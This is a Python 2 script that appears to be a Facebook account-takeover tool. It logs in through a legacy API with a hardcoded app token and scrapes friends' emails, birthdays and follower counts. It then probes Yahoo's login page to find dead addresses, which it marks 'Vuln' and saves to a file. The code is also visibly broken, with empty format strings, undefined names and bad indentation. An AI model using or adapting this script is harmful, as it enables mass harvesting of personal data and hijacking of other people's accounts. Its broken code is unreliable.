#!/usr/bin/python
# -*- coding: utf-8 -*-

import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib, requests, mechanize
from multiprocessing.pool import ThreadPool

from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

M="\033[0;91m"
P="\033[0;97m"
H="\033[0;92m"
B="\033[1;46m"
R="\033[0m"
url="https://graph.facebook.com/{}"
target=[]

def cloning():
	data=s.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email={}&locale=en_US&password={}&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6".format(raw_input("[•] email: "%(H,P)),getpass("[•] passs: "%(H,P)))).json()
	try:
		a=data["access_token"]
	except KeyError:
		exit("[!] failed when generate access token !!"%(M,P))
	print "----------------------------------------"
	print "[*] fetching all user id "%(H,P)
	sleep(1)
	try:
		for x in s.get(url.format("me/friends?access_token="%(a))).json()["data"]:
			target.append(x["id"])
			print "\r[*]  retrieved  "%(H,P,x["id"]),
			sys.stdout.flush()
			sleep(0.003)
	except KeyError:
		print "\n[!] failed to retrive all user id"%(M,P)
		exit("[!] stopped"%(M,P))
	print "\n[*] all user id successfuly retrieved"%(H,P)
	print "[*] getting email friends"%(H,P)
	print "[*] start"%(H,P)
	print "----------------------------------------"
	o=open("mail_DIE.txt","w")
	for meki in target:
		try:
			b=s.get(url.format(meki+"?access_token="%(a))).json()
			c=s.get(url.format(meki+"/subscribers?access_token="%(a))).json()
			p=re.compile(r'@.*').search(b["email"]).group()
			if "yahoo.com" in p:
				br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com")
				br._factory.is_html=True
				br.select_form(nr=0)
				br["username"]=b["email"]
				i=br.submit().read()
				try:
					cek=re.compile(r'"messages.ERROR_INVALID_USERNAME">.*').search(i).group()
				except:continue
				if '"messages.ERROR_INVALID_USERNAME">' in cek:
					o.write("\n"%(b["email"]))
					print "[•] UID       : "%(H,P,H,b["id"])
					print "[•] Name      : "%(H,P,H,b["name"])
					print "[•] Email     : "%(H,P,H,b["email"])
					try:
						print "[•] Birthday  : "%(H,P,H,b["birthday"])
					except KeyError:print "[•] Birthday  : not found"%(M,P,M)
					print "[•] Followers : "%(H,P,H,str(c["summary"]["total_count"]))
					print "[•] Status    : Vuln\n"%(H,P,H)
		except KeyError:pass
		except requests.exceptions.ConnectionError:
			print "[!] no connection"%(M,P)
			exit("[!] stopped"%(M,P))
	o.close()
	print "\n[+] done.."%(H,P)
	exit("[#] file saved in: mail_DIE.txt"%(H,P,H))

if __name__=="__main__":
cloning()
